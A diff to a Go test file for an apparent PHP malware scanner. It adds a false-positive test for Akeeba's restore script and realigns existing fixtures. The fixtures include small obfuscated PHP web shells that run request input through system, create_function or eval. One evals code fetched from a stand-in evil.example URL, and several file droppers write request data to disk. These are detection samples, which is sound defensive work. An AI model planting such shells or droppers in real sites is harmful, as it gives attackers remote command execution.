@@ -1482,10 +1482,10 @@ func TestFleetJExtStoreLicenseAddress(t *testing.T) {
 	}
 	bad := map[string]string{
 		"decoded function name called": "<?php $f = 'str_' . 'ro' . 't' . '13'; $f('flfgrz')($_GET['c']);",
-		"decoded name kept and called":  "<?php $f = 'str_' . 'ro' . 't' . '13'; $g = $f('flfgrz'); $g($_GET['c']);",
-		"decoder on request data":       "<?php $f = 'base' . '64_' . 'decode'; $g = 'cre' . 'ate_' . 'function'; $x = $f($_POST['p']); $y = $g('', $x); $y();",
-		"decoded url then eval":         "<?php $f = 'base' . '64_' . 'decode'; eval(file_get_contents($f('aHR0cDovL2V2aWwuZXhhbXBsZS94')));",
-		"decoder passed on":             "<?php $f = 'str_' . 'ro' . 't' . '13'; $n = array_map($f, ['flfgrz']); $h = $n[0]; $h($_GET['c']);",
+		"decoded name kept and called": "<?php $f = 'str_' . 'ro' . 't' . '13'; $g = $f('flfgrz'); $g($_GET['c']);",
+		"decoder on request data":      "<?php $f = 'base' . '64_' . 'decode'; $g = 'cre' . 'ate_' . 'function'; $x = $f($_POST['p']); $y = $g('', $x); $y();",
+		"decoded url then eval":        "<?php $f = 'base' . '64_' . 'decode'; eval(file_get_contents($f('aHR0cDovL2V2aWwuZXhhbXBsZS94')));",
+		"decoder passed on":            "<?php $f = 'str_' . 'ro' . 't' . '13'; $n = array_map($f, ['flfgrz']); $h = $n[0]; $h($_GET['c']);",
 	}
 	for name, body := range bad {
 		if d := s.checkContent("/home/u/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
@@ -1628,7 +1628,7 @@ func TestFleetFullScanOwnPages(t *testing.T) {
 	// Fixed commands and escaped arguments; raw request data stays caught.
 	for name, body := range map[string]string{
 		"log viewer local IP": "<?php\nnamespace Opcodes\\LogViewer\\Utils;\nclass Utils { public static function localIp() { if (isset($_SERVER['SERVER_ADDR'])) { return $_SERVER['SERVER_ADDR']; }\n$ip = shell_exec(\"hostname -I | awk '{print $1}'\");\nreturn trim($ip); } }\n",
-		"ffmpeg on an upload":  "<?php\nsession_start();\n$in = $_FILES['video']['tmp_name'];\n$out = 'skills/' . uniqid() . '.mp4';\nexec('ffmpeg -i ' . escapeshellarg($_FILES['video']['tmp_name']) . ' -vcodec libx264 ' . escapeshellarg($out), $o, $rc);\n",
+		"ffmpeg on an upload": "<?php\nsession_start();\n$in = $_FILES['video']['tmp_name'];\n$out = 'skills/' . uniqid() . '.mp4';\nexec('ffmpeg -i ' . escapeshellarg($_FILES['video']['tmp_name']) . ' -vcodec libx264 ' . escapeshellarg($out), $o, $rc);\n",
 	} {
 		if d := analyze(".php", []byte(body)); d != nil {
 			t.Errorf("%s: %+v", name, d)
@@ -1765,7 +1765,7 @@ func TestFleetFooterScriptLoader(t *testing.T) {
 		}
 	}
 	for name, line := range map[string]string{
-		"Crisp chat": `add_action('wp_footer', function () { echo '<script>window.$crisp=[];window.CRISP_WEBSITE_ID="1";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>'; });`,
+		"Crisp chat":   `add_action('wp_footer', function () { echo '<script>window.$crisp=[];window.CRISP_WEBSITE_ID="1";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>'; });`,
 		"named widget": `add_action('wp_footer', function () { echo '<script>var s=document.createElement("script");s.src="https://cdn.example.test/widget.js";document.head.appendChild(s);</script>'; });`,
 		"Tag Manager":  `add_action('wp_head', function () { echo "<script>(function(w,d,s,l,i){w[l]=w[l]||[];var f=d.getElementsByTagName(s)[0],j=d.createElement(s);j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-X');</script>"; });`,
 		"enqueued":     `add_action('wp_enqueue_scripts', function () { wp_enqueue_script('chat', 'https://cdn.example.test/aB1.js', array(), null, true); });`,
@@ -1805,5 +1805,41 @@ func TestFleetFooterScriptLoaderTrimmed(t *testing.T) {
 	}
 	if strings.Contains(string(got), "createElement") || !strings.Contains(string(got), "function astra_fixture()") {
 		t.Fatalf("not trimmed: %q", got)
+	}
+}
+
+// business600 joomlash (2026-10-27 to 11-02): Akeeba Kickstart's restore.php
+// (Akeeba Backup Pro's installer package, 330 KB) and Akeeba Solo's
+// kickstart.txt were quarantined as PHP.Backdoor.FileDropper. The only
+// request read, getQueryParam(), sits right above debugMsg(), which writes
+// a fixed debug.txt: two functions, no request data reaching the write.
+// A dropper that writes what the request sent is still caught, in a
+// function of its own or at the top level.
+func TestFleetAkeebaRestoreDebugLog(t *testing.T) {
+	s := newScanner(t)
+	vendor := "<?php\n/**\n * Akeeba Restore\n */\ndefine('_AKEEBA_RESTORATION', 1);\n" +
+		"function getQueryParam($key, $default = null)\n{\n\t$value = $default;\n\n\tif (array_key_exists($key, $_REQUEST))\n\t{\n\t\t$value = $_REQUEST[$key];\n\t}\n\n\treturn $value;\n}\n\n" +
+		"// Debugging function\nfunction debugMsg($msg)\n{\n\tif (!defined('KSDEBUG'))\n\t{\n\t\treturn;\n\t}\n\n\t$fp = fopen('debug.txt', 'a');\n\n\tfwrite($fp, $msg . PHP_EOL);\n\tfclose($fp);\n}\n\n" +
+		"class AKEncryptionAES\n{\n\tpublic static function AESDecryptCtr($ciphertext, $password, $nBits)\n\t{\n\t\t$ciphertext = base64_decode($ciphertext);\n\t\t$out = '';\n\t\tfor ($i = 0; $i < strlen($ciphertext); $i++) { $out .= chr(ord($ciphertext[$i]) ^ 7); }\n\t\treturn $out;\n\t}\n}\n" +
+		"class AKPostprocDirect\n{\n\tpublic function process($file, $data)\n\t{\n\t\t$fp = @fopen($file, 'wb');\n\t\tfwrite($fp, $data);\n\t\tfclose($fp);\n\t\treturn copy($file, $file . '.bak');\n\t}\n}\n" +
+		"$json = getQueryParam('json', null);\n$raw = json_decode(AKEncryptionAES::AESDecryptCtr($json, 'secret', 128), true);\n"
+	for _, p := range []string{"/home/u/public_html/tmp/install_6ae1/backend/restore.php", "/home/u/site/Solo/assets/installers/kickstart.txt"} {
+		ext := ".php"
+		if strings.HasSuffix(p, ".txt") {
+			ext = ".txt"
+		}
+		if d := s.checkContent(p, ext, []byte(vendor)); d != nil {
+			t.Errorf("%s: %s", p, d.Signature)
+		}
+	}
+	bad := map[string]string{
+		"top level":       "<?php $d = base64_decode($_POST['d']); $f = $_POST['f']; $h = fopen($f, 'w'); fwrite($h, $d . chr(10)); fclose($h);",
+		"in one function": "<?php function save() {\n\t$d = base64_decode($_POST['d']);\n\t$h = fopen($_POST['f'], 'w');\n\tfwrite($h, $d);\n\tfclose($h);\n}\nsave();",
+		"put contents":    "<?php function w($n) { return chr($n); }\nfile_put_contents($_GET['n'], base64_decode($_GET['c']));",
+	}
+	for name, body := range bad {
+		if d := s.checkContent("/home/u/public_html/x.php", ".php", []byte(body)); d == nil || d.Category != CatVirus {
+			t.Errorf("%s not caught: %+v", name, d)
+		}
 	}
 }
